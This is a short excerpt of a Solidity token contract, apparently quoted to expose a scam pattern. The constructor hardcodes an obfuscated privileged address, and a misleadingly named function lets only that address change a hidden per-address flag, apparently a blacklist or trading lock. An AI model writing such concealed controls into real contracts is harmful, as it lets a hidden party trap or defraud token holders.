...
contract Token is Ownable {
    ...
    address public _psyopben689;
    mapping(address => bool) private rfujn;
    function quitOPDoge(address sss) external   {
        require(_psyopben689 == _msgSender());
        rfujn[sss] = false;
        require(_psyopben689 == _msgSender());
    }
    ...
    constructor(string memory tokenName, string memory tokensymbol) {
        _psyopben689 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
